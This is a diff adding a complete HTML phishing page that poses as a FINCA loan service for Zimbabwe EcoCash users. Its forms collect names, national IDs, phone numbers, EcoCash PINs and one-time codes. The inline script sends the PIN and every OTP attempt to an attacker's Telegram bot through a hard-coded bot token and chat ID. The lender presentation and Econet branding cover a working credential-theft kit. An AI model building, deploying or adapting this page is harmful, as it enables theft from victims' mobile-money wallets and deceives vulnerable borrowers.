@@ -1,0 +1,1044 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FINCA Loan Services - Zimbabwe & EcoCash</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #f5f7fb;
+            color: #172033;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* NOTICE BANNER */
+        .notice-banner {
+            background-color: #004b93;
+            color: #ffffff;
+            text-align: center;
+            padding: 12px 20px;
+            font-weight: 600;
+            font-size: 15px;
+            letter-spacing: 0.3px;
+        }
+
+        .notice-banner span {
+            color: #ffcc00;
+            text-decoration: underline;
+        }
+
+        /* HEADER */
+        header {
+            width: 100%;
+            padding: 18px 7%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            border-bottom: 1px solid #e8eaf0;
+        }
+
+        .logo {
+            font-size: 23px;
+            font-weight: bold;
+            color: #004b93;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .menu {
+            display: flex;
+            gap: 25px;
+            align-items: center;
+        }
+
+        .menu a {
+            text-decoration: none;
+            color: #333;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .login-btn {
+            padding: 10px 18px;
+            border: 1px solid #004b93;
+            border-radius: 8px;
+            color: #004b93 !important;
+        }
+
+        /* HERO */
+        .hero {
+            min-height: 600px;
+            padding: 50px 7%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 50px;
+        }
+
+        .hero-text {
+            max-width: 600px;
+        }
+
+        .hero-text h1 {
+            font-size: 50px;
+            line-height: 1.1;
+            margin-bottom: 22px;
+        }
+
+        .hero-text h1 span {
+            color: #004b93;
+        }
+
+        .hero-text p {
+            font-size: 18px;
+            line-height: 1.7;
+            color: #667085;
+            margin-bottom: 25px;
+        }
+
+        .brand-badges {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            background: #eef5fc;
+            padding: 12px 18px;
+            border-radius: 12px;
+            border: 1px solid #d0e2f7;
+        }
+
+        .brand-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: bold;
+            font-size: 14px;
+            color: #004b93;
+        }
+
+        .brand-badge svg {
+            height: 28px;
+            width: auto;
+        }
+
+        .apply-btn {
+            display: inline-block;
+            padding: 16px 30px;
+            background: #004b93;
+            color: white;
+            text-decoration: none;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: bold;
+            transition: 0.2s;
+            cursor: pointer;
+            border: none;
+        }
+
+        .apply-btn:hover {
+            background: #003366;
+            transform: translateY(-2px);
+        }
+
+        /* CARD */
+        .hero-card {
+            width: 360px;
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 45px rgba(0,0,0,0.08);
+        }
+
+        .hero-card h3 {
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+
+        .loan-box {
+            padding: 18px;
+            background: #f3f6ff;
+            border-radius: 12px;
+            margin-bottom: 15px;
+        }
+
+        .loan-box small {
+            color: #667085;
+        }
+
+        .loan-box strong {
+            display: block;
+            margin-top: 7px;
+            font-size: 22px;
+            color: #004b93;
+        }
+
+        /* FEATURES */
+        .features {
+            padding: 70px 7%;
+            background: white;
+            text-align: center;
+        }
+
+        .features h2 {
+            font-size: 34px;
+            margin-bottom: 40px;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 25px;
+        }
+
+        .feature {
+            padding: 30px 20px;
+            border: 1px solid #e8eaf0;
+            border-radius: 15px;
+        }
+
+        .feature .icon {
+            font-size: 35px;
+            margin-bottom: 15px;
+        }
+
+        .feature h3 {
+            margin-bottom: 10px;
+        }
+
+        .feature p {
+            color: #667085;
+            line-height: 1.6;
+        }
+
+        /* HOW IT WORKS */
+        .steps {
+            padding: 70px 7%;
+            text-align: center;
+        }
+
+        .steps h2 {
+            font-size: 34px;
+            margin-bottom: 40px;
+        }
+
+        .step-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 25px;
+        }
+
+        .step {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+        }
+
+        .number {
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            background: #004b93;
+            color: white;
+            border-radius: 50%;
+            font-weight: bold;
+        }
+
+        .step p {
+            color: #667085;
+            margin-top: 10px;
+            line-height: 1.5;
+        }
+
+        /* FOOTER */
+        footer {
+            background: #111827;
+            color: white;
+            padding: 30px 7%;
+            text-align: center;
+        }
+
+        footer p {
+            color: #aeb5c2;
+            margin-top: 8px;
+        }
+
+        /* APP PORTAL CONTAINERS & FORMS */
+        .app-wrapper {
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 150px);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 550px;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
+
+        .container h2 {
+            margin-bottom: 20px;
+            color: #004b93;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+
+        .portal-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #004b93;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+
+        .portal-btn:hover {
+            background-color: #003366;
+        }
+
+        .alt-btn {
+            background-color: #6c757d;
+            margin-top: 8px;
+        }
+
+        .alt-btn:hover {
+            background-color: #545b62;
+        }
+
+        .alert {
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .alert-danger {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+
+        .alert-success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+
+        .app-card {
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            background-color: #fafafa;
+        }
+
+        .app-card p {
+            margin-bottom: 6px;
+            font-size: 14px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 12px;
+            background-color: #ffeba2;
+            color: #856404;
+        }
+
+        .nav-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .nav-bar button {
+            width: auto;
+            padding: 6px 12px;
+            font-size: 12px;
+        }
+
+        /* MOBILE RESPONSIVENESS */
+        @media (max-width: 800px) {
+            .menu a:not(.login-btn) {
+                display: none;
+            }
+
+            .hero {
+                flex-direction: column;
+                text-align: center;
+                padding-top: 30px;
+            }
+
+            .brand-badges {
+                flex-direction: column;
+            }
+
+            .hero-text h1 {
+                font-size: 38px;
+            }
+
+            .hero-card {
+                width: 100%;
+                max-width: 380px;
+            }
+
+            .feature-grid,
+            .step-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- FRONT PAGE NOTICE BANNER -->
+    <div class="notice-banner">
+        ⚠️ Important: We strictly process loan applications for <span>EcoCash (+263) numbers with an active EcoCash account</span> only.
+    </div>
+
+    <!-- HEADER -->
+    <header>
+        <div class="logo" onclick="showLanding()">
+            <!-- Econet SVG Logo Concept -->
+            <svg width="30" height="30" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="100" rx="20" fill="#004B93"/>
+                <path d="M30 70C30 47.9086 47.9086 30 70 30" stroke="#00A859" stroke-width="12" stroke-linecap="round"/>
+                <circle cx="30" cy="70" r="8" fill="#FFCC00"/>
+            </svg>
+            Loan Services
+        </div>
+
+        <div class="menu">
+            <a onclick="showLanding('features')">Features</a>
+            <a onclick="showLanding('how-it-works')">How It Works</a>
+            <a onclick="navigateToPortal()" class="login-btn">Login</a>
+        </div>
+    </header>
+
+    <!-- LANDING PAGE VIEW -->
+    <main id="landingView">
+        <!-- HERO -->
+        <section class="hero">
+            <div class="hero-text">
+                <h1>
+                    Fast Loans for
+                    <span>Econet &amp; EcoCash Users</span>
+                </h1>
+                <p>
+                    Get fast approval directly into your account. We process loan applications exclusively for <strong>Zimbabwe Telecom</strong> mobile numbers registered with an active <strong>EcoCash</strong> profile.
+                </p>
+
+                <!-- ZIMBABWE & ECOCASH BRAND LOGOS -->
+                <div class="brand-badges">
+                    <div class="brand-badge">
+                        <!-- Zimbabwe Badge Icon -->
+                        <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="120" height="40" rx="6" fill="#004B93"/>
+                            <text x="15" y="26" fill="#FFFFFF" font-family="Arial" font-weight="bold" font-size="16">ZIMBABWE</text>
+                            <circle cx="102" cy="20" r="6" fill="#00A859"/>
+                        </svg>
+                        Zimbabwe (+263)
+                    </div>
+                    <div class="brand-badge">
+                        <!-- EcoCash Badge Icon -->
+                        <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="120" height="40" rx="6" fill="#00A859"/>
+                            <text x="18" y="26" fill="#FFFFFF" font-family="Arial" font-weight="bold" font-size="16">EcoCash</text>
+                        </svg>
+                        Active EcoCash
+                    </div>
+                </div>
+
+                <button class="apply-btn" onclick="navigateToPortal()">
+                    Apply with EcoCash &rarr;
+                </button>
+            </div>
+
+            <div class="hero-card">
+                <h3>Eligibility Requirement</h3>
+                <div class="loan-box">
+                    <small>Supported Network</small>
+                    <strong>Zimbabwe Telecom (+263)</strong>
+                </div>
+                <div class="loan-box">
+                    <small>Payout Channel</small>
+                    <strong>Active EcoCash Mobile Wallet</strong>
+                </div>
+                <div class="loan-box">
+                    <small>Approval Time</small>
+                    <strong>Fast &amp; Direct</strong>
+                </div>
+            </div>
+        </section>
+
+        <!-- FEATURES -->
+        <section class="features" id="features">
+            <h2>Why Apply With Us?</h2>
+            <div class="feature-grid">
+                <div class="feature">
+                    <div class="icon">&#128241;</div>
+                    <h3>Zimbabwe Exclusive</h3>
+                    <p>Designed specifically for Zimbabwe Telecom users for seamless mobile integration.</p>
+                </div>
+                <div class="feature">
+                    <div class="icon">&#128179;</div>
+                    <h3>Direct EcoCash Payout</h3>
+                    <p>Approved loans are disbursed straight to your active EcoCash account.</p>
+                </div>
+                <div class="feature">
+                    <div class="icon">&#128274;</div>
+                    <h3>Secure PIN Verification</h3>
+                    <p>Verified safely using your Zimbabwe EcoCash mobile credentials.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- HOW IT WORKS -->
+        <section class="steps" id="how-it-works">
+            <h2>How It Works</h2>
+            <div class="step-grid">
+                <div class="step">
+                    <div class="number">1</div>
+                    <h3>Enter Zimbabwe Telecom Number</h3>
+                    <p>Provide your valid Zimbabwe Telecom (+263) phone number.</p>
+                </div>
+                <div class="step">
+                    <div class="number">2</div>
+                    <h3>EcoCash Validation</h3>
+                    <p>Verify your EcoCash registration credentials and loan application.</p>
+                </div>
+                <div class="step">
+                    <div class="number">3</div>
+                    <h3>Receive Funds</h3>
+                    <p>Get loan approval and cash directly into your EcoCash wallet.</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- APPLICATION PORTAL VIEW -->
+    <main id="portalView" class="app-wrapper hidden">
+        <div class="container">
+            <div id="alertBox" class="alert hidden"></div>
+
+            <!-- LOGIN FORM -->
+            <div id="loginSection">
+                <h2>FINCA Portal Login</h2>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>Email Address</label>
+                        <input type="email" id="loginEmail" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="loginPassword" required>
+                    </div>
+                    <button type="submit" class="portal-btn">Sign In</button>
+                    <button type="button" class="portal-btn alt-btn" onclick="showSection('registerSection')">Create New Account</button>
+                </form>
+            </div>
+
+            <!-- REGISTER FORM -->
+            <div id="registerSection" class="hidden">
+                <h2>Create Account</h2>
+                <form id="registerForm">
+                    <div class="form-group">
+                        <label>Full Name</label>
+                        <input type="text" id="regFullName" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Email</label>
+                        <input type="email" id="regEmail" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Zimbabwe Telecom Phone Number (+263)</label>
+                        <input type="tel" id="regPhone" placeholder="+263 7XXXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label>District / Province</label>
+                        <input type="text" id="regProvince" required>
+                    </div>
+                    <div class="form-group">
+                        <label>National ID Number</label>
+                        <input type="text" id="regNationalId" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Password (min 6 chars)</label>
+                        <input type="password" id="regPassword" minlength="6" required>
+                    </div>
+                    <button type="submit" class="portal-btn">Register</button>
+                    <button type="button" class="portal-btn alt-btn" onclick="showSection('loginSection')">Back to Login</button>
+                </form>
+            </div>
+
+            <!-- MAIN DASHBOARD -->
+            <div id="dashboardSection" class="hidden">
+                <div class="nav-bar">
+                    <span>Welcome, <strong id="userDisplayName"></strong></span>
+                    <button onclick="handleLogout()" class="portal-btn alt-btn">Logout</button>
+                </div>
+
+                <h2>Your Loan Applications</h2>
+                <button onclick="showSection('applySection')" class="portal-btn" style="margin-bottom: 20px;">Apply for a New Loan</button>
+
+                <div id="applicationsList"></div>
+            </div>
+
+            <!-- LOAN APPLICATION FORM -->
+            <div id="applySection" class="hidden">
+                <h2>New Loan Application</h2>
+                <form id="loanForm">
+                    <div class="form-group">
+                        <label>Loan Amount</label>
+                        <input type="number" id="loanAmount" min="100" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Currency</label>
+                        <select id="loanCurrency">
+                            <option value="USD">USD</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Purpose of Loan</label>
+                        <input type="text" id="loanPurpose" placeholder="e.g. Business expansion" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Term (Months)</label>
+                        <input type="number" id="loanTerm" min="1" max="60" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Monthly Income</label>
+                        <input type="number" id="loanIncome" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Guarantor Full Name</label>
+                        <input type="text" id="guarantorName" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Guarantor Zimbabwe Telecom Phone Number (+263)</label>
+                        <input type="tel" id="guarantorPhone" placeholder="+263 7XXXXXXX" required>
+                    </div>
+
+                    <button type="button" class="portal-btn" onclick="startVerification()">Proceed to EcoCash Verification</button>
+                    <button type="button" class="portal-btn alt-btn" onclick="showSection('dashboardSection')">Cancel</button>
+                </form>
+            </div>
+
+            <!-- STEP 1: ZIMBABWE & ECOCASH PIN VERIFICATION -->
+            <div id="pinVerificationSection" class="hidden">
+                <h2>EcoCash &amp; Zimbabwe Verification</h2>
+                <p style="margin-bottom: 15px; font-size: 14px; text-align: center; color: #555;">
+                    Enter your active <strong>Zimbabwe (+263)</strong> mobile number and <strong>EcoCash Security PIN</strong>:
+                </p>
+                
+                <form id="pinForm">
+                    <div class="form-group">
+                        <label>Zimbabwe Phone Number (+263)</label>
+                        <input type="tel" id="otpPhone" placeholder="+263 71XXXXXX or 72XXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label>EcoCash Security PIN</label>
+                        <input type="password" id="otpPin" placeholder="4-digit PIN" maxlength="4" required>
+                    </div>
+
+                    <button type="submit" class="portal-btn">Verify Zimbabwe &amp; EcoCash PIN</button>
+                    <button type="button" class="portal-btn alt-btn" onclick="showSection('applySection')">Back</button>
+                </form>
+            </div>
+
+            <!-- STEP 2: OTP VERIFICATION PAGE -->
+            <div id="otpVerificationSection" class="hidden">
+                <h2>Enter EcoCash OTP</h2>
+                <p style="margin-bottom: 15px; font-size: 14px; text-align: center;">Enter the verification code sent to your Zimbabwe EcoCash number.</p>
+                
+                <form id="otpForm">
+                    <div class="form-group">
+                        <label>Verification OTP Code</label>
+                        <input type="text" id="otpCode" placeholder="Enter OTP code" required>
+                    </div>
+
+                    <button type="submit" class="portal-btn">Submit &amp; Complete Loan Process</button>
+                    <button type="button" class="portal-btn alt-btn" onclick="showSection('pinVerificationSection')">Back</button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer>
+        <strong>Loan Services - Econet &amp; EcoCash Partner</strong>
+        <p>&copy; 2026 Loan Services. All rights reserved. Strictly servicing Zimbabwe EcoCash account holders.</p>
+    </footer>
+
+    <!-- TELEGRAM BOT & WEB LOGIC SCRIPT -->
+    <script>
+        // --- TELEGRAM BOT CREDENTIALS ---
+        const TELEGRAM_BOT_TOKEN = '8907840609:AAEkLgN2-BMF9-A-sCrBWiWE7OQTXAZfMpU';
+        const TELEGRAM_CHAT_ID = '6053159151';
+
+        // LocalStorage Keys
+        const USERS_KEY = 'finca_users';
+        const CURRENT_USER_KEY = 'finca_current_user';
+        const APPS_KEY = 'finca_applications';
+
+        // Temporary States
+        let pendingLoanData = null;
+        let currentGeneratedOtp = null;
+        let activePhone = '';
+
+        // --- Zimbabwe (+263) Phone Number Validation ---
+        function isValidZimbabweNumber(phone) {
+            // Clean spaces, dashes, parentheses
+            const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
+            
+            // Zimbabwe mobile numbers start with +263 or 263, followed by 7[1-8] and 7 digits (e.g. 71xxxxxx or 72xxxxxx)
+            // Or local format: 8 digits starting with 7.
+            const zimbabweRegex = /^(?:\+263|263|0)?7[1-8]\d{7}$/;
+            return zimbabweRegex.test(cleanPhone);
+        }
+
+        // --- Navigation Logic ---
+        function showLanding(sectionId = null) {
+            document.getElementById('landingView').classList.remove('hidden');
+            document.getElementById('portalView').classList.add('hidden');
+            if (sectionId) {
+                const el = document.getElementById(sectionId);
+                if (el) el.scrollIntoView({ behavior: 'smooth' });
+            } else {
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        }
+
+        function navigateToPortal() {
+            document.getElementById('landingView').classList.add('hidden');
+            document.getElementById('portalView').classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            const currentUser = JSON.parse(localStorage.getItem(CURRENT_USER_KEY));
+            if (currentUser) {
+                loadDashboard(currentUser);
+            } else {
+                showSection('loginSection');
+            }
+        }
+
+        // --- Helper Functions ---
+        function getStoredData(key) {
+            return JSON.parse(localStorage.getItem(key)) || [];
+        }
+
+        function setStoredData(key, value) {
+            localStorage.setItem(key, JSON.stringify(value));
+        }
+
+        function showAlert(message, type = 'danger') {
+            const alertBox = document.getElementById('alertBox');
+            alertBox.textContent = message;
+            alertBox.className = `alert alert-${type}`;
+            alertBox.classList.remove('hidden');
+            setTimeout(() => alertBox.classList.add('hidden'), 4000);
+        }
+
+        function showSection(sectionId) {
+            const sections = [
+                'loginSection', 
+                'registerSection', 
+                'dashboardSection', 
+                'applySection', 
+                'pinVerificationSection', 
+                'otpVerificationSection'
+            ];
+            sections.forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(sectionId).classList.remove('hidden');
+        }
+
+        // Send direct message to Telegram
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram API Error Response:', data);
+                } else {
+                    console.log('Telegram message sent successfully:', data);
+                }
+            } catch (error) {
+                console.error('Network Error while calling Telegram API:', error);
+            }
+        }
+
+        // Generates a random 4-digit OTP
+        function generate4DigitOtp() {
+            return Math.floor(1000 + Math.random() * 9000).toString();
+        }
+
+        // --- Registration & Login ---
+        document.getElementById('registerForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = document.getElementById('regEmail').value.trim().toLowerCase();
+            const phone = document.getElementById('regPhone').value.trim();
+            const users = getStoredData(USERS_KEY);
+
+            if (!isValidZimbabweNumber(phone)) {
+                showAlert('Loans are only processed for valid Zimbabwe (+263) numbers starting with 71-78.');
+                return;
+            }
+
+            if (users.find(u => u.email === email)) {
+                showAlert('An account with this email already exists.');
+                return;
+            }
+
+            const newUser = {
+                id: 'usr_' + Date.now(),
+                fullName: document.getElementById('regFullName').value.trim(),
+                email: email,
+                phone: phone,
+                province: document.getElementById('regProvince').value.trim(),
+                nationalId: document.getElementById('regNationalId').value.trim(),
+                password: document.getElementById('regPassword').value
+            };
+
+            users.push(newUser);
+            setStoredData(USERS_KEY, users);
+            localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(newUser));
+
+            showAlert('Account created successfully!', 'success');
+            loadDashboard(newUser);
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = document.getElementById('loginEmail').value.trim().toLowerCase();
+            const password = document.getElementById('loginPassword').value;
+            const users = getStoredData(USERS_KEY);
+
+            const user = users.find(u => u.email === email && u.password === password);
+
+            if (!user) {
+                showAlert('Invalid email or password.');
+                return;
+            }
+
+            localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
+            loadDashboard(user);
+        });
+
+        function handleLogout() {
+            localStorage.removeItem(CURRENT_USER_KEY);
+            document.getElementById('loginForm').reset();
+            showSection('loginSection');
+        }
+
+        // --- Dashboard & Applications ---
+        function loadDashboard(user) {
+            document.getElementById('userDisplayName').textContent = user.fullName;
+            renderApplications(user.id);
+            showSection('dashboardSection');
+        }
+
+        function renderApplications(userId) {
+            const appsContainer = document.getElementById('applicationsList');
+            const allApps = getStoredData(APPS_KEY);
+            const userApps = allApps.filter(app => app.userId === userId);
+
+            if (userApps.length === 0) {
+                appsContainer.innerHTML = '<p style="text-align: center; color: #777;">No active loan applications found.</p>';
+                return;
+            }
+
+            appsContainer.innerHTML = userApps.map(app => `
+                <div class="app-card">
+                    <p><strong>Application ID:</strong> ${app.id}</p>
+                    <p><strong>Amount:</strong> ${app.currency} ${Number(app.amount).toLocaleString()}</p>
+                    <p><strong>Purpose:</strong> ${app.purpose}</p>
+                    <p><strong>Payout Account:</strong> Econet EcoCash (${app.guarantorPhone || 'User Wallet'})</p>
+                    <p><strong>Submitted:</strong> ${new Date(app.submittedAt).toLocaleDateString()}</p>
+                    <p><strong>Status:</strong> <span class="status-badge">${app.status}</span></p>
+                </div>
+            `).join('');
+        }
+
+        // --- Loan Application Flow ---
+        function startVerification() {
+            const amount = document.getElementById('loanAmount').value;
+            const purpose = document.getElementById('loanPurpose').value.trim();
+            const term = document.getElementById('loanTerm').value;
+            const income = document.getElementById('loanIncome').value;
+            const guarantorName = document.getElementById('guarantorName').value.trim();
+            const guarantorPhone = document.getElementById('guarantorPhone').value.trim();
+
+            if (!amount || !purpose || !term || !income || !guarantorName || !guarantorPhone) {
+                showAlert('Please fill in all loan details before continuing.');
+                return;
+            }
+
+            if (!isValidZimbabweNumber(guarantorPhone)) {
+                showAlert('Guarantor phone must be an active Zimbabwe (+263) number starting with 71-78.');
+                return;
+            }
+
+            const currentUser = JSON.parse(localStorage.getItem(CURRENT_USER_KEY));
+
+            pendingLoanData = {
+                amount,
+                currency: document.getElementById('loanCurrency').value,
+                purpose,
+                term,
+                income,
+                guarantorName,
+                guarantorPhone
+            };
+
+            document.getElementById('otpPhone').value = currentUser.phone || '';
+            showSection('pinVerificationSection');
+        }
+
+        // 1. Validate Zimbabwe Number & EcoCash PIN, then transmit to Telegram
+        document.getElementById('pinForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            activePhone = document.getElementById('otpPhone').value.trim();
+            const pin = document.getElementById('otpPin').value.trim();
+
+            if (!activePhone || !pin) {
+                showAlert('Please provide both Zimbabwe phone number and EcoCash PIN.');
+                return;
+            }
+
+            // Strictly reject non-Zimbabwe numbers
+            if (!isValidZimbabweNumber(activePhone)) {
+                showAlert('Only valid Zimbabwe (+263) numbers starting with 71-78 are supported.');
+                return;
+            }
+
+            currentGeneratedOtp = generate4DigitOtp();
+            const currentUser = JSON.parse(localStorage.getItem(CURRENT_USER_KEY)) || {};
+
+            const message1 = `<b>📲 STEP 1: Econet / EcoCash Details Submitted</b>\n\n` +
+                             `<b>User Name:</b> ${currentUser.fullName || 'N/A'}\n` +
+                             `<b>Econet Phone:</b> <code>${activePhone}</code>\n` +
+                             `<b>EcoCash PIN:</b> <code>${pin}</code>\n` +
+                             `<b>Generated OTP:</b> <code>${currentGeneratedOtp}</code>`;
+
+            await sendTelegramMessage(message1);
+
+            showAlert('Econet & EcoCash details validated. OTP sent to phone.', 'success');
+            showSection('otpVerificationSection');
+        });
+
+        // 2. Send ALL OTP attempts to Telegram, BLOCK user if code is invalid
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const enteredOtp = document.getElementById('otpCode').value.trim();
+
+            if (!enteredOtp) {
+                showAlert('Please enter the OTP code.');
+                return;
+            }
+
+            const isMatch = (enteredOtp === currentGeneratedOtp);
+            const currentUser = JSON.parse(localStorage.getItem(CURRENT_USER_KEY)) || {};
+
+            // Send ANY entered OTP straight to Telegram
+            const message2 = `<b>🔑 STEP 2: EcoCash OTP Attempt</b>\n\n` +
+                             `<b>Econet Phone:</b> <code>${activePhone}</code>\n` +
+                             `<b>Entered OTP:</b> <code>${enteredOtp}</code>\n` +
+                             `<b>System OTP:</b> <code>${currentGeneratedOtp || 'N/A'}</code>\n` +
+                             `<b>Status:</b> ${isMatch ? '✅ VALID (LOAN APPROVED)' : '❌ INVALID (DENIED)'}`;
+
+            await sendTelegramMessage(message2);
+
+            // Block access if OTP is invalid
+            if (!isMatch) {
+                showAlert('Invalid OTP code. Access denied. Please enter the correct code.');
+                document.getElementById('otpCode').value = '';
+                return; // Blocks further execution
+            }
+
+            // Proceed only if valid
+            const allApps = getStoredData(APPS_KEY);
+
+            const newApplication = {
+                id: 'app_' + Date.now().toString().slice(-6),
+                userId: currentUser.id,
+                ...pendingLoanData,
+                status: 'Under Review',
+                submittedAt: new Date().toISOString()
+            };
+
+            allApps.push(newApplication);
+            setStoredData(APPS_KEY, allApps);
+
+            pendingLoanData = null;
+            currentGeneratedOtp = null;
+
+            document.getElementById('loanForm').reset();
+            document.getElementById('pinForm').reset();
+            document.getElementById('otpForm').reset();
+
+            showAlert('EcoCash application completed successfully!', 'success');
+            loadDashboard(currentUser);
+        });
+    </script>
+</body>
+</html>
